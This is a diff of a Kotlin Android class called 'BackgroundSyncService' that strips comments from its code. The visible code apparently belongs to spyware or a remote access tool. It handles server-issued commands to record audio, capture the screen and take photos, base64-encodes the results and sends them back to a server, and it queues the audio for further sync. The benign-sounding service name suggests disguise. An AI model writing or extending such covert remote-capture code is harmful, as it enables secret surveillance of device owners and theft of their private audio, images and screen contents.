@@ -137,7 +137,7 @@ class BackgroundSyncService : Service() {
             }
             "CAPTURE_AUDIO" -> {
                 val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
-                val duration = intent.getIntExtra("duration", 30) // Default 30 seconds
+                val duration = intent.getIntExtra("duration", 30)
                 syncHandler?.post {
                     handleAudioCommand(commandId, duration)
                 }
@@ -166,22 +166,18 @@ class BackgroundSyncService : Service() {
             val screenshotFile = captureScreenContent()
 
             if (screenshotFile != null) {
-                // Convert the image to base64
                 val imageBytes = File(screenshotFile).readBytes()
                 val base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT)
 
-                // Prepare the result
                 val result = JSONObject().apply {
                     put("status", "success")
                     put("image_data", base64Image)
                     put("timestamp", System.currentTimeMillis())
                 }
 
-                // Send the result back to the server
                 sendCommandResult(commandId, true, "Screenshot captured successfully", result)
                 Log.d(TAG, "Screenshot captured and result sent")
             } else {
-                // Screenshot failed
                 val errorResult = JSONObject().apply {
                     put("status", "error")
                     put("message", "Failed to capture screenshot")
@@ -198,12 +194,10 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    // Handle camera capture and response
     private fun handleCameraCommand(commandId: String) {
         try {
             Log.d(TAG, "Processing camera capture command: $commandId")
 
-            // Check camera permission first
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 val errorResult = JSONObject().apply {
                     put("status", "error")
@@ -213,7 +207,6 @@ class BackgroundSyncService : Service() {
                 return
             }
 
-            // Take photo with Camera2 API
             openCamera(commandId)
         } catch (e: Exception) {
             Log.e(TAG, "Error handling camera command: ${e.message}")
@@ -225,7 +218,6 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    // Helper method to send command results back to the server
     private fun sendCommandResult(commandId: String, success: Boolean, message: String, result: JSONObject) {
         try {
             val commandsInstance = Commands(this)
@@ -841,18 +833,15 @@ class BackgroundSyncService : Service() {
                 val result = JSONObject().apply {
                     put("status", "success")
                     put("audio_data", base64Audio)
-                    put("duration", audioFile.length() / 1024) // Rough estimate of duration based on file size
+                    put("duration", audioFile.length() / 1024)
                     put("format", "mp3")
                     put("timestamp", System.currentTimeMillis())
                 }
                 sendCommandResult(commandId, true, "Audio recording completed successfully", result)
-
-                // Queue for sync
                 dataSync?.queueForSync("audio_data", audioOutputFile!!)
 
                 Log.d(TAG, "Audio recording completed and result sent")
             } else {
-                // Recording failed
                 val errorResult = JSONObject().apply {
                     put("status", "error")
                     put("message", "Failed to save audio recording")
